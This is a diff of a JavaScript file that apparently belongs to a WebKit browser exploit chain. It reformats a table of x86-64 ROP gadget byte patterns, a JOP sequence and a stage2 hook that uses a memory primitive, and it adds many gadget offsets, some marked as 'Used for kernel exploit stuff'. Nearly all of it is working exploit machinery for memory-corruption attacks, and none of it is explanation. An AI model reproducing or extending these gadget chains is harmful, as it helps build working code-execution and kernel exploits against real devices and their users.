@@ -59,54 +59,73 @@ var get_jmptgt = function(addr)
     
 }
 var gadgetmap_wk = {
-    "ep": [0x5B, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0x5D, 0xC3],
-    "pop rsi": [0x5E, 0xC3],
-    "pop rdi": [0x5F, 0xC3],
-    "pop rsp": [0x5c, 0xC3],
-    "pop rax": [0x58, 0xC3],
-    "pop rdx": [0x5a, 0xC3],
-    "pop rcx": [0x59, 0xC3],
-    "pop rsp": [0x5c, 0xC3],
-    "pop rbp": [0x5d, 0xC3],
-    "pop r8": [0x47, 0x58, 0xC3],
-    "pop r9": [0x47, 0x59, 0xC3],
-    "infloop": [0xEB, 0xFE, 0xc3],
-    "ret": [0xC3],
-    "mov [rdi], rsi": [0x48, 0x89, 0x37, 0xC3],
-    "mov [rax], rsi": [0x48, 0x89, 0x30, 0xC3],
-    "mov [rdi], rax": [0x48, 0x89, 0x07, 0xC3],
-    "mov rxa, rdi": [0x48, 0x89, 0xF8, 0xC3]
+  "ep": [0x5b, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0x5d, 0xc3],
+  "pop rsi": [0x5e, 0xc3],
+  "pop rdi": [0x5f, 0xc3],
+  "pop rsp": [0x5c, 0xc3],
+  "pop rax": [0x58, 0xc3],
+  "pop rdx": [0x5a, 0xc3],
+  "pop rcx": [0x59, 0xc3],
+  "pop rsp": [0x5c, 0xc3],
+  "pop rbp": [0x5d, 0xc3],
+  "pop r8": [0x47, 0x58, 0xc3],
+  "pop r9": [0x47, 0x59, 0xc3],
+  "infloop": [0xeb, 0xfe, 0xc3],
+  "ret": [0xc3],
+  "mov [rdi], rsi": [0x48, 0x89, 0x37, 0xc3],
+  "mov [rax], rsi": [0x48, 0x89, 0x30, 0xc3],
+  "mov [rdi], rax": [0x48, 0x89, 0x07, 0xc3],
+  "mov rax, rdi": [0x48, 0x89, 0xf8, 0xc3]
 };
+
 var slowpath_jop = [0x48, 0x8B, 0x7F, 0x48, 0x48, 0x8B, 0x07, 0x48, 0x8B, 0x40, 0x30, 0xFF, 0xE0];
 slowpath_jop.reverse();
 
 var gadgets;
-window.stage2 = function() {
-    try {
-        window.stage2_();
-    } catch (e) {
-        print(e);
-    }
+window.stage2 = function () {
+  try {
+    window.stage2_();
+  } catch (e) {
+    print(e);
+  }
 }
 var gadgetcache = {
-"ret":60,
-"ep":173,
-"pop rbp":182,
-"pop rax":17781,
-"mov rax, rdi":23248,
-"pop r8":100517,
-"pop rsp":128173,
-"mov [rdi], rsi":150754,
-"pop rcx":169041,
-"pop rdi":239071,
-"pop rsi":597265,
-"mov [rdi], rax":782172,
-"jop":813600,
-"pop rdx":1092690,
-"mov [rax], rsi":2484823,
-"pop r9":21430095,
-"infloop":22604906},
- gadgetoffs = {};
+  "ret":                    0x0000003C,
+  "jmp rax":                0x00000082,
+  "ep":                     0x000000AD,   
+  "pop rbp":                0x000000B6,
+  "mov [rdi], rax":         782172,
+  "pop r8":                 0x000179C5,    
+  "pop rax":                17781,
+  "mov rax, rdi":           0x000058D0,
+  "mov rax, [rax]":         0x0006C83A,
+  "pop rsi":                597265,
+  "pop rdi":                239071,
+  "pop rcx":                0x00052E59,  
+  "pop rsp":                128173,
+  "mov [rdi], rsi":         150754,
+  "mov [rax], rsi":         0x00256667,
+  "pop rdx":                0x001BE024,     
+  "pop r9":                 0x00BB320F,
+  "jop":                    813600,  
+  "infloop":                0x01545EAA,
+
+  "add rax, rcx":           0x000156DB,
+  "add rax, rsi":           0x001520C6,
+  "and rax, rsi":           0x01570B9F,
+  "mov rdx, rax":           0x00353B31,
+  "mov rdi, rax":           0x015A412F,
+  "mov rax, rdx":           0x001CEF20,
+  "jmp rdi":                0x00295E7E,
+  
+    // Used for kernel exploit stuff
+  "mov rbp, rsp":           0x000F094A,
+  "mov rax, [rdi]":         0x00046EF9,
+  "add rdi, rax":           0x005557DF,
+  "add rax, rsi":           0x001520C6,
+  "and rax, rsi":           0x01570B9F,
+  "jmp rdi":                0x00295E7E,
+}
  
 window.stage2_ = function() {
     p = window.prim;
